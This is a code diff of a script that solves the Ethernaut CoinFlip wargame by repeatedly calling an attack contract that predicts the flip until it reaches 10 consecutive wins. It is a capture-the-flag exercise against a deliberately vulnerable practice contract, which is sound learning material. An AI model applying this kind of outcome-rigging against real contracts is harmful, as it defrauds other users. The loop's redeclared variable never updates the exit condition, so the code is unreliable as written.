@@ -18,19 +18,18 @@ const attackCoinFlip = async () => {
     const attack = await ethers.getContract("AttackCoinFlip");
     const contract = await ethers.getContractAt("CoinFlip", coinFlipAddress);
     console.log("Checking consecutive wins, it should be zero...");
-    const winsCheck = (await contract.consecutiveWins()).toString();
+    const winsCheck = await contract.consecutiveWins();
     console.log(`Consecutive win is: ${winsCheck}`);
     console.log("Rigging game by predicting result with the attack contract...");
-    // const tx1 = await attack.guess(coinFlipAddress);
     // TODO: check for lastHash via blockhash and block.number
-    // while (winsCheck != "10") {
-    //     const checkWin = (await contract.consecutiveWins()).toString();
-    //     console.log(`Current consecutiveWin is: ${checkWin}`);
-    //     const tx = await attack.guess(coinFlipAddress);
-    //     const txReceipt = await tx.wait(2);
-    //     console.log("Transaction done, aiming for '10' wins...");
-    //     const winsCheck = (await contract.consecutiveWins()).toString();
-    // }
+    while (winsCheck < 10) {
+        const checkWin = (await contract.consecutiveWins()).toString();
+        console.log(`Current consecutiveWin is: ${checkWin}`);
+        const tx = await attack.guess(coinFlipAddress);
+        const txReceipt = await tx.wait(2);
+        console.log("Transaction done, aiming for '10' wins...");
+        const winsCheck = await contract.consecutiveWins();
+    }
     console.log("10 wins achieved, you may submit to ethernaut");
 };
 
